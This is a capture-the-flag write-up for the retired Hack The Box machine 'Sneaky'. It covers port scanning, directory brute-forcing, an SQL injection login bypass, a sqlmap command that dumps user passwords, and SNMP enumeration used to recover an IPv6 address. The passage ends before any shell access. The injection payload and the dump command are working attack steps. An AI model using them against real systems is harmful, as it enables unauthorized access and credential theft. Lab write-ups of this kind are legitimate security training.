# Sneaky

This is the write-up for the box Sneaky that got retired at the 11th November 2017.
My IP address was 10.10.14.19 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.20    sneaky.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/sneaky.nmap 10.10.10.20
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!
```

UDP port scan:
```markdown
nmap -sU -o nmap/sneaky_udp.nmap 10.10.10.20
```

```markdown
PORT    STATE SERVICE
161/udp open  snmp
```

## Checking HTTP (Port 80)

On the web page it says that _"This Page is Under Development"_ and nothing interesting in the source code.
Lets look for hidden paths with **Gobuster**:
```markdown
gobuster -u http://10.10.10.20 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds a _/dev_ folder and when browsing there we see a login page with the title _"Member's Area Only - Login Now!"_
When trying out default usernames and passwords, it outputs _"Not Found"_ and by trying out special characters, it outputs _"Internal Server Error"_.
So there is some kind of **SQL injection** flaw to abuse.
```markdown
name=admin&pass=' OR '1'='1
```

Sending this to the server logs us in and we are greeted with two names and the content of a RSA key file:
- name: admin
- name: thrasivoulos

As we can't use that RSA key yet, lets test the SQL Injection with **Sqlmap**:
```markdown
sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 --dump
```

It outputs the passwords of the users that are both the same:
> sup3rstr0ngp4ssf0r4d

There is no more attack surface here.

## Checking SNMP (Port 161)

As SNMP is listening on UDP, lets check the _public_ community string:
```markdown
snmpwalk -v2c -c public 10.10.10.20
```

Looking through the results, it outputs that IPv6 is activated which is not normal.
To filter for that community string with the IP addresses:
```markdown
snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.3
```

```markdown
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.20 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.197.169 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.197.169 = INTEGER: 2
```

The IPv6 address is written in decimal and needs to be converted in hexadecimal first.
To make this readable, we can install _snmp-mibs-downloader_, enable it and this will translate all the numbers into human readable strings.
```markdown
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:aa:41:46
```

This is how it looks as an IPv6 address:
```markdown
# Unique Local Address
dead:beef:0000:0000:0250:56ff:feaa:4146
```

This is a **Unique Local Address** but we need the **Link-Local Address** to connect to the box.
These start with _fe80_ and we put the rest of the IPv6 address at the end of it like this:
```markdown
# Link-Local Address
fe80:0000:0000:0000:0250:56ff:feaa:4146
```
